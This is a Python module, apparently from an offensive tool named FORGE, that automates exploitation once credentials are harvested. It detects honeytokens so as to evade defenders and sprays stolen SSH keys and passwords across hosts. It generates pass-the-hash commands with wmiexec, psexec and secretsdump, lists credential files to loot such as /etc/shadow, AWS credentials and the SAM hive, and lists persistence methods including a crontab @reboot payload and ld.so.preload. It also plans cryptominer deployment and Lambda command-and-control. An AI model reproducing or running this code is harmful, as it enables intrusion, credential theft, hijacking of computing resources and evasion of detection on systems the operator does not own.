"""
Credential-Triggered Auto-Exploitation Engine.

Event-driven architecture: when credentials are harvested, FORGE automatically:
1. Canary-checks before any use
2. Dispatches to type-specific handler (11 credential types)
3. Tests credentials against known hosts (parallel, semaphore-limited)
4. On success: profiles hardware → deploys miner → harvests more creds → persistence
5. Recursive credential chaining (new creds → new exploitation cycles)

Integrates with: operations_db, session_restore.AttackGraph, operations_daemon.EventBus
"""
import asyncio
import base64
import hashlib
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from o1o_o.core.operations_db import OperationsDB


# ─── Credential Data Model ───────────────────────────────────────

@dataclass
class Credential:
    """Unified credential representation."""
    cred_type: str          # ssh_key, aws_access_key, password, ntlm_hash, etc.
    value: str              # The actual credential data
    username: str = ''
    domain: str = ''
    source_host: str = ''   # Where it was found
    source_path: str = ''   # File/registry path
    is_canary: bool = False
    metadata: dict = field(default_factory=dict)
    discovered_at: float = field(default_factory=time.time)


# ─── Canary Detection ────────────────────────────────────────────

class CanaryDetector:
    """Detect honeytokens and canary credentials before use."""

    # Known canary patterns
    CANARY_PATTERNS = {
        'aws_access_key': [
            r'(?i)canary|honey|trap|decoy|bait|alert',
        ],
        'ssh_key': [
            r'(?i)canary|honeypot|honeytoken|decoy|DO-NOT-USE|thinkst',
        ],
        'password': [
            r'(?i)honeytoken|canarytoken|canarytokens\.org',
        ],
    }

    # Known canary services (credentials that phone home when used)
    CANARY_DOMAINS = {
        'canarytokens.org', 'canary.tools', 'thinkst.com',
        'honeytokens.io', 'attacker-signal.com',
    }

    # Canary AWS account IDs (known honeypot AWS accounts)
    CANARY_AWS_ACCOUNTS = set()

    def __init__(self):
        self._canary_hashes: Set[str] = set()

    def add_known_canary(self, credential_hash: str):
        """Register a known canary hash."""
        self._canary_hashes.add(credential_hash)

    def check(self, cred: Credential) -> Tuple[bool, str]:
        """Check if credential is likely a canary.

        Returns:
            (is_canary, reason)
        """
        val = cred.value
        ctype = cred.cred_type

        # Check hash against known canaries
        h = hashlib.sha256(val.encode()).hexdigest()
        if h in self._canary_hashes:
            return True, 'known_canary_hash'

        # Check patterns
        patterns = self.CANARY_PATTERNS.get(ctype, [])
        for pat in patterns:
            if re.search(pat, val):
                return True, f'pattern_match:{pat}'

        # Check source path for canary indicators
        if cred.source_path:
            canary_paths = ['honeypot', 'canary', 'decoy', 'bait', '.canary']
            for cp in canary_paths:
                if cp in cred.source_path.lower():
                    return True, f'path_indicator:{cp}'

        # Check metadata for canary domains
        for domain in self.CANARY_DOMAINS:
            if domain in str(cred.metadata).lower() or domain in val.lower():
                return True, f'canary_domain:{domain}'

        # AWS-specific: check for canary account IDs
        if ctype == 'aws_access_key' and cred.metadata.get('account_id'):
            if cred.metadata['account_id'] in self.CANARY_AWS_ACCOUNTS:
                return True, 'canary_aws_account'

        # Entropy check — very low entropy credentials are suspicious
        if len(val) > 10:
            unique_chars = len(set(val))
            if unique_chars < len(val) * 0.3:
                return True, 'low_entropy_suspicious'

        return False, ''


# ─── Username Derivation ─────────────────────────────────────────

def derive_usernames(cred: Credential) -> List[str]:
    """Derive possible usernames from a credential."""
    usernames = set()

    # Explicit username
    if cred.username:
        usernames.add(cred.username)

    # Common defaults
    usernames.update(['root', 'admin', 'administrator', 'ubuntu', 'ec2-user',
                      'centos', 'deploy', 'app', 'www-data', 'git'])

    # Extract from source path
    if cred.source_path:
        # /home/USER/.ssh/id_rsa → USER
        m = re.search(r'/home/([^/]+)/', cred.source_path)
        if m:
            usernames.add(m.group(1))
        # C:\Users\USER → USER
        m = re.search(r'Users[/\\]([^/\\]+)', cred.source_path)
        if m:
            usernames.add(m.group(1))

    # Extract from domain
    if cred.domain:
        # DOMAIN\user or user@domain
        parts = re.split(r'[\\@]', cred.domain)
        usernames.update(parts)

    # Extract from metadata
    if cred.metadata.get('owner'):
        usernames.add(cred.metadata['owner'])

    return list(usernames)


# ─── Hardware Profiling Commands ─────────────────────────────────

HARDWARE_PROFILE_COMMANDS = {
    'linux': {
        'cpu_model': "grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | xargs",
        'cpu_cores': "nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo",
        'ram_mb': "free -m 2>/dev/null | awk '/^Mem:/{print $2}'",
        'gpu_model': "lspci 2>/dev/null | grep -i 'vga\\|3d\\|display' | head -1",
        'gpu_nvidia': "nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null | head -1",
        'disk_gb': "df -BG / 2>/dev/null | awk 'NR==2{print $2}' | tr -d G",
        'os_version': "cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'",
        'kernel': "uname -r",
        'uptime': "uptime -s 2>/dev/null || uptime",
        'load_avg': "cat /proc/loadavg 2>/dev/null | awk '{print $1,$2,$3}'",
        'net_interfaces': "ip -br addr 2>/dev/null || ifconfig -a 2>/dev/null",
    },
    'darwin': {
        'cpu_model': "sysctl -n machdep.cpu.brand_string",
        'cpu_cores': "sysctl -n hw.ncpu",
        'ram_mb': "sysctl -n hw.memsize | awk '{print int($1/1048576)}'",
        'gpu_model': "system_profiler SPDisplaysDataType 2>/dev/null | grep 'Chipset Model' | head -1",
        'disk_gb': "df -g / | awk 'NR==2{print $2}'",
        'os_version': "sw_vers -productVersion",
    },
    'windows': {
        'cpu_model': 'wmic cpu get name /value',
        'cpu_cores': 'wmic cpu get NumberOfCores /value',
        'ram_mb': 'wmic memorychip get capacity /value',
        'gpu_model': 'wmic path win32_VideoController get name /value',
        'os_version': 'wmic os get Caption /value',
    },
}


# ─── Exploitation Action Templates ───────────────────────────────

SSH_TEST_TEMPLATE = """
import socket, hashlib
def test_ssh(host, port, username, key_data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        banner = s.recv(256)
        s.close()
        return bool(banner and b'SSH' in banner)
    except:
        return False
"""

AWS_ENUMERATE_TEMPLATE = """
import json, urllib.request, hashlib, hmac, time
from datetime import datetime

def aws_sts_identity(access_key, secret_key, region='us-east-1'):
    service = 'sts'
    host = f'{service}.amazonaws.com'
    endpoint = f'https://{host}/'
    method = 'POST'
    body = 'Action=GetCallerIdentity&Version=2011-06-15'
    now = datetime.utcnow()
    datestamp = now.strftime('%Y%m%d')
    amz_date = now.strftime('%Y%m%dT%H%M%SZ')
    credential_scope = f'{datestamp}/{region}/{service}/aws4_request'
    headers_to_sign = f'host:{host}\\nx-amz-date:{amz_date}\\n'
    signed_headers = 'host;x-amz-date'
    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical = f'{method}\\n/\\n\\n{headers_to_sign}\\n{signed_headers}\\n{payload_hash}'
    string_to_sign = f'AWS4-HMAC-SHA256\\n{amz_date}\\n{credential_scope}\\n{hashlib.sha256(canonical.encode()).hexdigest()}'
    def sign(key, msg):
        return hmac.new(key, msg.encode(), hashlib.sha256).digest()
    k = sign(sign(sign(sign(f'AWS4{secret_key}'.encode(), datestamp), region), service), 'aws4_request')
    signature = hmac.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = f'AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}'
    req = urllib.request.Request(endpoint, data=body.encode(),
        headers={'Host': host, 'X-Amz-Date': amz_date, 'Authorization': auth, 'Content-Type': 'application/x-www-form-urlencoded'})
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return resp.read().decode()
    except:
        return None
"""

NTLM_RELAY_TEMPLATE = """
import socket, struct, hashlib, hmac
def ntlm_type1(domain=''):
    msg = b'NTLMSSP\\x00\\x01\\x00\\x00\\x00\\x97\\x82\\x08\\xe2'
    msg += struct.pack('<HH', len(domain), len(domain))
    msg += struct.pack('<I', 32 + len(domain))
    msg += b'\\x00' * 8  # workstation
    msg += domain.encode()
    return msg

def ntlm_authenticate(ntlm_hash, challenge, username, domain=''):
    lm_resp = b'\\x00' * 24
    nt_resp_key = hashlib.new('md4', (username.upper() + domain).encode('utf-16-le')).digest()
    return lm_resp, nt_resp_key
"""


# ─── Credential Trigger Engine ───────────────────────────────────

class CredentialTriggerEngine:
    """Event-driven credential exploitation engine.

    When credentials are harvested, automatically:
    1. Canary-check (refuse to use honeytokens)
    2. Dispatch to type-specific handler
    3. Test against all known hosts (parallel)
    4. On access: profile → miner → harvest → persist → discover

    Supports 11 credential types with dedicated handlers.
    """

    def __init__(self, ops_db: OperationsDB, op_id: str,
                 event_callback: Callable = None,
                 max_concurrent: int = 10):
        self.db = ops_db
        self.op_id = op_id
        self._callback = event_callback or (lambda e: None)
        self._semaphore = asyncio.Semaphore(max_concurrent)
        self._canary_detector = CanaryDetector()

        # Processing state
        self._processed: Set[str] = set()  # credential hashes
        self._compromised_hosts: Set[str] = set()
        self._depth = 0
        self._max_depth = 5  # Max recursive exploitation depth

        # Handler dispatch table
        self.handlers: Dict[str, Callable] = {
            'ssh_key': self._handle_ssh_key,
            'aws_access_key': self._handle_aws_key,
            'password': self._handle_password,
            'ntlm_hash': self._handle_ntlm,
            'kerberos_tgt': self._handle_tgt,
            'oauth_token': self._handle_oauth,
            'vpn_psk': self._handle_vpn,
            'wifi_psk': self._handle_wifi,
            'api_key': self._handle_api_key,
            'browser_saved': self._handle_browser_cred,
            'certificate': self._handle_certificate,
        }

    def _emit(self, event_type: str, data: dict, severity: str = 'info'):
        event = {'type': event_type, 'severity': severity,
                 'timestamp': time.time(), 'data': data}
        self._callback(event)
        try:
            self.db.log_event(self.op_id, event_type, severity, details=data)
        except Exception:
            pass

    def _cred_hash(self, cred: Credential) -> str:
        return hashlib.sha256(f'{cred.cred_type}:{cred.value}'.encode()).hexdigest()

    async def on_credential_harvested(self, cred: Credential):
        """Main event handler — dispatches credential to appropriate handler."""
        # Dedup
        ch = self._cred_hash(cred)
        if ch in self._processed:
            return
        self._processed.add(ch)

        # Depth check
        if self._depth >= self._max_depth:
            self._emit('max_depth_reached', {
                'depth': self._depth,
                'cred_type': cred.cred_type,
            }, 'warning')
            return

        # Step 1: Canary check
        is_canary, reason = self._canary_detector.check(cred)
        if is_canary:
            cred.is_canary = True
            self._emit('canary_detected', {
                'cred_type': cred.cred_type,
                'source_host': cred.source_host,
                'reason': reason,
            }, 'critical')
            # Store but mark as canary
            try:
                self.db.add_credential(
                    self.op_id, cred.cred_type,
                    username=cred.username, domain=cred.domain,
                    value=cred.value, source=cred.source_path,
                )
            except Exception:
                pass
            return

        # Store credential
        try:
            self.db.add_credential(
                self.op_id, cred.cred_type,
                username=cred.username, domain=cred.domain,
                value=cred.value, source=cred.source_path,
            )
        except Exception:
            pass

        self._emit('credential_harvested', {
            'cred_type': cred.cred_type,
            'username': cred.username,
            'source_host': cred.source_host,
            'depth': self._depth,
        })

        # Step 2: Dispatch to handler
        handler = self.handlers.get(cred.cred_type)
        if handler:
            self._depth += 1
            try:
                await handler(cred)
            except Exception as e:
                self._emit('handler_error', {
                    'cred_type': cred.cred_type,
                    'error': str(e),
                }, 'warning')
            finally:
                self._depth -= 1

    async def _handle_ssh_key(self, cred: Credential):
        """SSH key → test against all SSH hosts, parallel."""
        hosts = self.db.get_hosts(self.op_id)
        ssh_hosts = [h for h in hosts if h.get('services')
                     and 'ssh' in str(h.get('services', '')).lower()]
        if not ssh_hosts:
            ssh_hosts = hosts  # Try all hosts

        usernames = derive_usernames(cred)
        results = []

        for host in ssh_hosts[:20]:  # Limit to 20 hosts
            ip = host.get('ip', '')
            if not ip or ip in self._compromised_hosts:
                continue
            for username in usernames[:5]:  # Limit usernames
                async with self._semaphore:
                    success = await self._test_ssh_connection(ip, username)
                    if success:
                        results.append((ip, username))
                        self._compromised_hosts.add(ip)
                        await self._on_new_host_access(
                            host, username, 'ssh_key', cred
                        )
                        break  # One success per host is enough

        self._emit('ssh_key_tested', {
            'hosts_tested': len(ssh_hosts),
            'successes': len(results),
            'results': results[:10],
        })

    async def _handle_aws_key(self, cred: Credential):
        """AWS access key → enumerate permissions, deploy infrastructure."""
        # Extract key parts
        access_key = cred.value
        secret_key = cred.metadata.get('secret_key', '')
        if not secret_key:
            # Try to extract from value if combined
            parts = cred.value.split(':')
            if len(parts) == 2:
                access_key, secret_key = parts

        if not access_key.startswith('AKIA'):
            self._emit('aws_key_invalid', {'key_prefix': access_key[:4]}, 'warning')
            return

        self._emit('aws_key_processing', {
            'key_prefix': access_key[:8] + '...',
            'actions': ['sts_identity', 'iam_enumerate', 's3_enumerate',
                        'ec2_enumerate', 'lambda_enumerate'],
        })

        # Generate exploitation code
        exploit_actions = {
            'identity_check': AWS_ENUMERATE_TEMPLATE,
            'iam_enumerate': self._generate_aws_iam_enumerate(access_key),
            's3_enumerate': self._generate_aws_s3_enumerate(access_key),
            'ec2_backdoor': self._generate_aws_ec2_deploy(access_key),
            'lambda_c2': self._generate_aws_lambda_c2(access_key),
        }

        self._emit('aws_exploitation_plan', {
            'key': access_key[:8] + '...',
            'actions_generated': list(exploit_actions.keys()),
        })

    async def _handle_password(self, cred: Credential):
        """Password → spray against all services."""
        hosts = self.db.get_hosts(self.op_id)
        services = ['ssh', 'rdp', 'smb', 'ftp', 'mysql', 'postgres', 'mssql']

        spray_results = []
        usernames = derive_usernames(cred)

        for host in hosts[:15]:
            ip = host.get('ip', '')
            if not ip or ip in self._compromised_hosts:
                continue
            for username in usernames[:3]:
                async with self._semaphore:
                    # Test SSH (most common)
                    success = await self._test_ssh_connection(ip, username)
                    if success:
                        spray_results.append((ip, username, 'ssh'))
                        self._compromised_hosts.add(ip)
                        await self._on_new_host_access(
                            host, username, 'password', cred
                        )

        self._emit('password_spray_complete', {
            'hosts_tested': len(hosts),
            'successes': len(spray_results),
        })

    async def _handle_ntlm(self, cred: Credential):
        """NTLM hash → pass-the-hash, relay attacks."""
        self._emit('ntlm_processing', {
            'hash_type': 'NTLMv2' if ':' in cred.value else 'NTLMv1',
            'username': cred.username,
            'domain': cred.domain,
            'actions': ['pth_smb', 'pth_wmi', 'ntlm_relay'],
        })

        # Generate PtH commands
        pth_commands = self._generate_pth_commands(cred)
        self._emit('ntlm_commands_generated', {
            'commands': len(pth_commands),
            'types': list(pth_commands.keys()),
        })

    async def _handle_tgt(self, cred: Credential):
        """Kerberos TGT → golden ticket, pass-the-ticket."""
        self._emit('kerberos_processing', {
            'ticket_type': 'TGT',
            'domain': cred.domain,
            'actions': ['ptt', 'golden_ticket', 'silver_ticket', 'kerberoast'],
        })

    async def _handle_oauth(self, cred: Credential):
        """OAuth token → API access, token refresh chain."""
        self._emit('oauth_processing', {
            'token_prefix': cred.value[:20] + '...',
            'metadata': cred.metadata,
            'actions': ['validate_token', 'enumerate_scopes', 'refresh_chain'],
        })

    async def _handle_vpn(self, cred: Credential):
        """VPN PSK → network access expansion."""
        self._emit('vpn_processing', {
            'vpn_type': cred.metadata.get('vpn_type', 'unknown'),
            'actions': ['connect', 'enumerate_internal', 'pivot'],
        })

    async def _handle_wifi(self, cred: Credential):
        """WiFi PSK → network access."""
        self._emit('wifi_processing', {
            'ssid': cred.metadata.get('ssid', 'unknown'),
            'security': cred.metadata.get('security', 'WPA2'),
            'actions': ['connect', 'arp_scan', 'pivot'],
        })

    async def _handle_api_key(self, cred: Credential):
        """Generic API key → identify service, exploit."""
        # Try to identify the API service
        service = self._identify_api_service(cred.value)
        self._emit('api_key_processing', {
            'service': service,
            'key_prefix': cred.value[:12] + '...',
            'actions': ['identify_service', 'enumerate_access', 'exfil'],
        })

    async def _handle_browser_cred(self, cred: Credential):
        """Browser saved credential → test on identified services."""
        self._emit('browser_cred_processing', {
            'domain': cred.domain,
            'username': cred.username,
            'actions': ['test_login', 'session_hijack', 'cookie_replay'],
        })

    async def _handle_certificate(self, cred: Credential):
        """X.509 certificate → mutual TLS, code signing."""
        self._emit('certificate_processing', {
            'source': cred.source_path,
            'actions': ['extract_key', 'mtls_auth', 'code_signing', 'ssl_intercept'],
        })

    # ─── Exploitation Helpers ─────────────────────────────────

    async def _test_ssh_connection(self, host: str, username: str,
                                    port: int = 22, timeout: float = 5.0) -> bool:
        """Test SSH connectivity (banner grab)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            banner = sock.recv(256)
            sock.close()
            return bool(banner and b'SSH' in banner)
        except Exception:
            return False

    async def _on_new_host_access(self, host: dict, username: str,
                                   method: str, cred: Credential):
        """Handler when access to a new host is confirmed."""
        host_id = host.get('host_id', '')

        # 1. Update host status
        try:
            self.db.update_host_status(host_id, 'compromised')
        except Exception:
            pass

        # 2. Generate hardware profiling commands
        platform = host.get('os', 'linux')
        profile_cmds = HARDWARE_PROFILE_COMMANDS.get(platform,
                                                      HARDWARE_PROFILE_COMMANDS['linux'])

        # 3. Generate credential harvesting commands
        harvest_locations = self._get_harvest_locations(platform)

        # 4. Generate persistence deployment
        persistence_methods = self._get_persistence_methods(platform)

        self._emit('host_compromised', {
            'host_id': host_id,
            'ip': host.get('ip'),
            'username': username,
            'method': method,
            'depth': self._depth,
            'profile_commands': len(profile_cmds),
            'harvest_locations': len(harvest_locations),
            'persistence_methods': len(persistence_methods),
        }, 'critical')

    def _get_harvest_locations(self, platform: str) -> List[dict]:
        """Get credential harvest locations for a platform."""
        if platform in ('linux', 'darwin'):
            return [
                {'path': '/etc/shadow', 'type': 'password_hash'},
                {'path': '~/.ssh/id_rsa', 'type': 'ssh_key'},
                {'path': '~/.ssh/id_ed25519', 'type': 'ssh_key'},
                {'path': '~/.ssh/authorized_keys', 'type': 'ssh_key'},
                {'path': '~/.aws/credentials', 'type': 'aws_access_key'},
                {'path': '~/.config/gcloud/', 'type': 'api_key'},
                {'path': '~/.kube/config', 'type': 'api_key'},
                {'path': '~/.docker/config.json', 'type': 'api_key'},
                {'path': '~/.netrc', 'type': 'password'},
                {'path': '~/.pgpass', 'type': 'password'},
                {'path': '~/.my.cnf', 'type': 'password'},
                {'path': '/etc/openvpn/', 'type': 'vpn_psk'},
                {'path': '/etc/wireguard/', 'type': 'vpn_psk'},
                {'path': '~/.gnupg/', 'type': 'certificate'},
                {'path': '/tmp/', 'type': 'various'},
                {'path': '/var/log/', 'type': 'various'},
            ]
        elif platform == 'windows':
            return [
                {'path': r'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data', 'type': 'browser_saved'},
                {'path': r'C:\Users\*\.ssh\id_rsa', 'type': 'ssh_key'},
                {'path': r'C:\Users\*\.aws\credentials', 'type': 'aws_access_key'},
                {'path': r'HKLM\SAM', 'type': 'ntlm_hash'},
                {'path': r'HKLM\SECURITY', 'type': 'ntlm_hash'},
                {'path': r'C:\Users\*\AppData\Roaming\Microsoft\Credentials\*', 'type': 'password'},
            ]
        return []

    def _get_persistence_methods(self, platform: str) -> List[dict]:
        """Get persistence deployment methods for a platform."""
        if platform in ('linux', 'darwin'):
            return [
                {'method': 'crontab', 'command': 'crontab -l; echo "@reboot {payload}" | crontab -'},
                {'method': 'systemd_service', 'path': '/etc/systemd/system/'},
                {'method': 'bashrc', 'path': '~/.bashrc'},
                {'method': 'ssh_authorized_keys', 'path': '~/.ssh/authorized_keys'},
                {'method': 'ld_preload', 'path': '/etc/ld.so.preload'},
            ]
        elif platform == 'windows':
            return [
                {'method': 'registry_run', 'path': r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'},
                {'method': 'scheduled_task', 'command': 'schtasks /create'},
                {'method': 'startup_folder', 'path': r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'},
                {'method': 'wmi_subscription', 'command': 'wmic'},
            ]
        return []

    def _generate_pth_commands(self, cred: Credential) -> Dict[str, str]:
        """Generate pass-the-hash command templates."""
        ntlm = cred.value
        user = cred.username or 'Administrator'
        domain = cred.domain or '.'

        return {
            'smb_exec': f"python3 -c \"import smbclient; smbclient.register_session('{domain}', username='{user}', ntlm_hash='{ntlm}')\"",
            'wmi_exec': f"wmiexec.py {domain}/{user}@TARGET -hashes :{ntlm}",
            'psexec': f"psexec.py {domain}/{user}@TARGET -hashes :{ntlm}",
            'secretsdump': f"secretsdump.py {domain}/{user}@TARGET -hashes :{ntlm}",
        }

    def _generate_aws_iam_enumerate(self, access_key: str) -> str:
        return f"# IAM enumerate for {access_key[:8]}...\nimport json, urllib.request\n# enumerate-iam style brute\n"

    def _generate_aws_s3_enumerate(self, access_key: str) -> str:
        return f"# S3 enumerate for {access_key[:8]}...\n# List all buckets, check ACLs\n"

    def _generate_aws_ec2_deploy(self, access_key: str) -> str:
        return f"# EC2 backdoor for {access_key[:8]}...\n# Deploy spot instances for mining\n"

    def _generate_aws_lambda_c2(self, access_key: str) -> str:
        return f"# Lambda C2 for {access_key[:8]}...\n# Serverless command relay\n"

    def _identify_api_service(self, key: str) -> str:
        """Identify API service from key format."""
        if key.startswith('AKIA'):
            return 'aws'
        elif key.startswith('AIza'):
            return 'google_cloud'
        elif key.startswith('sk-'):
            return 'openai'
        elif key.startswith('ghp_') or key.startswith('gho_'):
            return 'github'
        elif key.startswith('xoxb-') or key.startswith('xoxp-'):
            return 'slack'
        elif key.startswith('SG.'):
            return 'sendgrid'
        elif key.startswith('sk_live_') or key.startswith('pk_live_'):
            return 'stripe'
        elif len(key) == 40 and all(c in '0123456789abcdef' for c in key):
            return 'possible_sha1_token'
        return 'unknown'

    def status(self) -> dict:
        """Get engine status."""
        return {
            'processed_credentials': len(self._processed),
            'compromised_hosts': len(self._compromised_hosts),
            'current_depth': self._depth,
            'max_depth': self._max_depth,
            'handlers': list(self.handlers.keys()),
        }
